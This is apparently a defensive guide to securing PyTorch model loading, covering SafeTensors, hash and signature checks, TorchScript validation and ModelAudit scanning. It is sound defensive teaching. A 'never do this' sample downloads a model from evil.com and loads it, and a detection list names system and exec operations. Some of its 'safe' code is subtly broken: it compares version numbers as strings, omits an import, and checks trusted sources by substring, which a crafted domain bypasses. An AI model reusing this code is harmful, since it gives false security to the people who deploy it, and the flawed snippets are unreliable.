# PyTorch Model Security Guide

A comprehensive guide to securing PyTorch models and preventing ML supply chain attacks.

## Table of Contents

1. [Understanding PyTorch Security Risks](#understanding-pytorch-security-risks)
2. [Safe Model Loading Practices](#safe-model-loading-practices)
3. [Model Format Security Comparison](#model-format-security-comparison)
4. [Supply Chain Security](#supply-chain-security)
5. [TorchScript Security Considerations](#torchscript-security-considerations)
6. [ModelAudit Integration](#modelaudit-integration)
7. [Security Checklist](#security-checklist)

## Understanding PyTorch Security Risks

### Primary Threat Vectors

1. **Pickle Deserialization (Critical)**
   - PyTorch models use Python's pickle for serialization
   - Pickle can execute arbitrary code during loading
   - Affects: `.pt`, `.pth`, `.pkl` model files

2. **TorchScript Injection (High)**
   - JIT-compiled code can contain malicious operations
   - Script modules can execute system commands
   - Affects: `torch.jit` compiled models

3. **Supply Chain Compromise (High)**
   - Models from untrusted sources
   - Compromised model repositories
   - Man-in-the-middle attacks during download

4. **Version-Specific Vulnerabilities (Variable)**
   - CVE-2025-32434: `weights_only=True` bypass
   - Framework bugs and security patches
   - Dependency vulnerabilities

## Safe Model Loading Practices

### ✅ Recommended Approaches

#### 1. Use SafeTensors Format (Best)
```python
from safetensors.torch import load_file, save_file
import torch
import torch.nn as nn

# Save model safely
model = MyModel()
save_file(model.state_dict(), "model.safetensors")

# Load model safely
state_dict = load_file("model.safetensors")
model = MyModel()
model.load_state_dict(state_dict)
```

#### 2. Updated PyTorch with Validation
```python
import torch
import hashlib
import os

def safe_load_pytorch_model(model_path, expected_hash=None, trusted_source=False):
    """Safely load PyTorch model with validation"""
    
    # 1. Verify file hash if provided
    if expected_hash:
        with open(model_path, 'rb') as f:
            actual_hash = hashlib.sha256(f.read()).hexdigest()
        if actual_hash != expected_hash:
            raise ValueError(f"Model hash mismatch: {actual_hash} != {expected_hash}")
    
    # 2. Check PyTorch version
    torch_version = torch.__version__
    if not trusted_source and torch_version <= "2.5.1":
        raise ValueError(f"PyTorch {torch_version} vulnerable to CVE-2025-32434")
    
    # 3. Load with weights_only (but don't rely on it for security)
    try:
        return torch.load(model_path, weights_only=True, map_location='cpu')
    except Exception as e:
        raise ValueError(f"Model loading failed: {e}")

# Usage
model_dict = safe_load_pytorch_model(
    "model.pt", 
    expected_hash="abc123...",
    trusted_source=True
)
```

#### 3. Sandboxed Loading
```python
import subprocess
import tempfile
import json

def load_model_in_sandbox(model_path):
    """Load model in isolated process"""
    
    # Create sandbox script
    sandbox_script = '''
import torch
import sys
import json

try:
    model = torch.load(sys.argv[1], weights_only=True, map_location='cpu')
    # Extract only safe data
    result = {
        "success": True,
        "state_dict_keys": list(model.keys()) if isinstance(model, dict) else [],
        "model_type": str(type(model))
    }
    print(json.dumps(result))
except Exception as e:
    result = {"success": False, "error": str(e)}
    print(json.dumps(result))
    '''
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write(sandbox_script)
        script_path = f.name
    
    try:
        # Run in isolated process
        result = subprocess.run([
            'python', script_path, model_path
        ], capture_output=True, text=True, timeout=30)
        
        return json.loads(result.stdout)
    finally:
        os.unlink(script_path)
```

### ❌ Dangerous Practices to Avoid

```python
# ❌ NEVER: Loading untrusted models without validation
model = torch.load('untrusted_model.pt')  # Can execute arbitrary code

# ❌ NEVER: Relying on weights_only=True for security
model = torch.load('untrusted_model.pt', weights_only=True)  # CVE-2025-32434

# ❌ NEVER: Loading models over HTTP without validation
import urllib.request
urllib.request.urlretrieve('http://evil.com/model.pt', 'model.pt')
model = torch.load('model.pt')

# ❌ NEVER: Ignoring model source validation
def load_any_model(url):
    # Download and load without any validation
    return torch.load(download_model(url))
```

## Model Format Security Comparison

| Format | Security Level | Pros | Cons |
|--------|---------------|------|------|
| **SafeTensors** | 🟢 **Highest** | No code execution, fast loading, cross-framework | Newer format, limited ecosystem |
| **ONNX** | 🟡 **Medium-High** | Standardized, some protections | Custom operators can be risky |
| **PyTorch (weights_only=True)** | 🟡 **Medium** | Built-in, widely supported | Still vulnerable to sophisticated attacks |
| **PyTorch (full)** | 🔴 **Lowest** | Complete model serialization | Arbitrary code execution |
| **Pickle Files** | 🔴 **Lowest** | Python native | Inherently unsafe |

### Migration Priority

1. **Immediate**: Stop using `torch.load()` without `weights_only=True`
2. **Short-term**: Update to PyTorch 2.6.0+
3. **Long-term**: Migrate to SafeTensors format

## Supply Chain Security

### Model Source Validation

#### 1. Trusted Repositories
```python
TRUSTED_SOURCES = [
    'huggingface.co',
    'pytorch.org',
    'github.com/pytorch',
    'your-internal-repo.com'
]

def validate_model_source(url):
    from urllib.parse import urlparse
    domain = urlparse(url).netloc.lower()
    return any(trusted in domain for trusted in TRUSTED_SOURCES)
```

#### 2. Cryptographic Verification
```python
import hashlib
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding

def verify_model_signature(model_path, signature_path, public_key):
    """Verify model cryptographic signature"""
    
    # Read model file
    with open(model_path, 'rb') as f:
        model_data = f.read()
    
    # Read signature
    with open(signature_path, 'rb') as f:
        signature = f.read()
    
    # Verify signature
    try:
        public_key.verify(
            signature,
            model_data,
            padding.PSS(
                mgf=padding.MGF1(hashes.SHA256()),
                salt_length=padding.PSS.MAX_LENGTH
            ),
            hashes.SHA256()
        )
        return True
    except Exception:
        return False
```

#### 3. Model Registry Integration
```python
class SecureModelRegistry:
    def __init__(self, registry_url, api_key):
        self.registry_url = registry_url
        self.api_key = api_key
    
    def download_model(self, model_id, verify_signature=True):
        """Download model with security validation"""
        
        # Get model metadata
        metadata = self.get_model_metadata(model_id)
        
        # Validate metadata
        if not self.validate_metadata(metadata):
            raise ValueError("Model metadata validation failed")
        
        # Download model file
        model_path = self.download_file(metadata['download_url'])
        
        # Verify hash
        if not self.verify_hash(model_path, metadata['sha256']):
            raise ValueError("Model hash verification failed")
        
        # Verify signature if required
        if verify_signature and not self.verify_signature(model_path, metadata):
            raise ValueError("Model signature verification failed")
        
        return model_path
```

## TorchScript Security Considerations

### Safe TorchScript Practices

#### 1. Avoid Dynamic Code Generation
```python
# ✅ SAFE: Static script compilation
class SafeModel(torch.nn.Module):
    def forward(self, x):
        return torch.relu(x)

scripted_model = torch.jit.script(SafeModel())

# ❌ DANGEROUS: Dynamic compilation with user input
def create_dynamic_model(user_code):
    # Never do this - can execute arbitrary code
    return torch.jit.CompilationUnit(user_code)
```

#### 2. Validate Script Modules
```python
def validate_script_module(module):
    """Validate TorchScript module for security"""
    
    # Check for dangerous operations
    dangerous_ops = ['aten::system', 'aten::exec', 'aten::eval']
    
    graph = module.graph
    for node in graph.nodes():
        if any(op in str(node) for op in dangerous_ops):
            raise ValueError(f"Dangerous operation found: {node}")
    
    return True
```

#### 3. Hook Security
```python
# ❌ DANGEROUS: Arbitrary hook functions
def dangerous_hook(module, input, output):
    exec("malicious code here")  # Never do this

model.register_forward_hook(dangerous_hook)

# ✅ SAFE: Validated hook functions
def safe_logging_hook(module, input, output):
    # Only safe operations
    print(f"Module {type(module)} called with input shape {input[0].shape}")

model.register_forward_hook(safe_logging_hook)
```

## ModelAudit Integration

### Automated Security Scanning

#### 1. Development Workflow
```bash
# Install ModelAudit with PyTorch support
pip install modelaudit[pytorch]

# Scan model before use
modelaudit my_model.pt --format json --output security_report.json

# Check exit code
if [ $? -eq 1 ]; then
    echo "Security issues found! Check security_report.json"
    exit 1
fi
```

#### 2. Python Integration
```python
from modelaudit import scan_file
import json

def secure_model_loading(model_path):
    """Load model only after security validation"""
    
    # Scan with ModelAudit
    result = scan_file(model_path)
    
    # Check for critical issues
    critical_issues = [
        issue for issue in result.issues 
        if issue.severity == 'CRITICAL'
    ]
    
    if critical_issues:
        raise ValueError(f"Critical security issues found: {critical_issues}")
    
    # Check for CVE-2025-32434 specifically
    cve_issues = [
        issue for issue in result.issues
        if 'CVE-2025-32434' in issue.message
    ]
    
    if cve_issues:
        raise ValueError("Model vulnerable to CVE-2025-32434")
    
    # Proceed with safe loading
    return torch.load(model_path, weights_only=True, map_location='cpu')
```

#### 3. CI/CD Integration
```yaml
# .github/workflows/model-security.yml
name: Model Security Scan

on:
  pull_request:
    paths:
      - '**/*.pt'
      - '**/*.pth'
      - '**/*.pkl'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Install ModelAudit
        run: pip install modelaudit[all]
      
      - name: Scan PyTorch Models
        run: |
          find . -name "*.pt" -o -name "*.pth" -o -name "*.pkl" | while read model; do
            echo "Scanning $model..."
            modelaudit "$model" --format json --output "scan-$(basename $model).json"
            
            # Check for critical issues
            if jq -e '.issues[] | select(.severity == "CRITICAL")' "scan-$(basename $model).json" > /dev/null; then
              echo "❌ Critical security issues found in $model"
              cat "scan-$(basename $model).json" | jq '.issues[] | select(.severity == "CRITICAL")'
              exit 1
            fi
            
            echo "✅ $model passed security scan"
          done
      
      - name: Archive Security Reports
        uses: actions/upload-artifact@v4
        with:
          name: security-reports
          path: scan-*.json
```

## Security Checklist

### Before Loading Any PyTorch Model

- [ ] **Verify Source**: Is the model from a trusted repository?
- [ ] **Check Hash**: Does the file hash match expected value?
- [ ] **Scan with ModelAudit**: Are there any security issues detected?
- [ ] **PyTorch Version**: Are you using PyTorch 2.6.0 or later?
- [ ] **Use weights_only=True**: As a basic precaution (not foolproof)
- [ ] **Validate Content**: Does the model behavior match expectations?

### For Production Deployments

- [ ] **Signature Verification**: Are models cryptographically signed?
- [ ] **Sandboxing**: Are models loaded in isolated environments?
- [ ] **Regular Scanning**: Is ModelAudit integrated in CI/CD?
- [ ] **Migration Plan**: Moving to SafeTensors format?
- [ ] **Incident Response**: Plan for handling compromised models?
- [ ] **Security Updates**: Process for patching vulnerabilities?

### For TorchScript Models

- [ ] **Static Compilation**: Avoid dynamic code generation?
- [ ] **Operation Validation**: No dangerous operations in graph?
- [ ] **Hook Review**: All hooks perform only safe operations?
- [ ] **Advanced Scanning**: ModelAudit TorchScript analysis enabled?

### For Development Teams

- [ ] **Training**: Team educated on ML security risks?
- [ ] **Policies**: Clear guidelines for model usage?
- [ ] **Tools**: ModelAudit integrated in development workflow?
- [ ] **Updates**: Regular security patch management?
- [ ] **Monitoring**: Automated security scanning in place?

## Emergency Response

If you discover you've loaded a malicious model:

1. **Immediate Actions**:
   - Disconnect from network
   - Kill the Python process
   - Check system for unauthorized changes
   - Scan for malware/backdoors

2. **Investigation**:
   - Analyze model with ModelAudit in isolated environment
   - Check logs for suspicious activity
   - Identify attack vector and compromised systems

3. **Recovery**:
   - Restore from clean backups
   - Update PyTorch to latest version
   - Implement additional security measures
   - Report incident if necessary

4. **Prevention**:
   - Review and strengthen model validation
   - Update security policies and training
   - Implement additional monitoring

## Conclusion

PyTorch model security requires a multi-layered approach combining:

- **Safe loading practices** with proper validation
- **Modern formats** like SafeTensors when possible  
- **Automated scanning** with tools like ModelAudit
- **Supply chain security** with verification and trusted sources
- **Continuous monitoring** and updates

The ML ecosystem is rapidly evolving, and new security threats emerge regularly. Stay informed about the latest vulnerabilities and maintain robust security practices throughout your ML pipeline.

---

**Remember**: Security is not a one-time setup but an ongoing process. Regular audits, updates, and vigilance are essential for maintaining secure ML systems.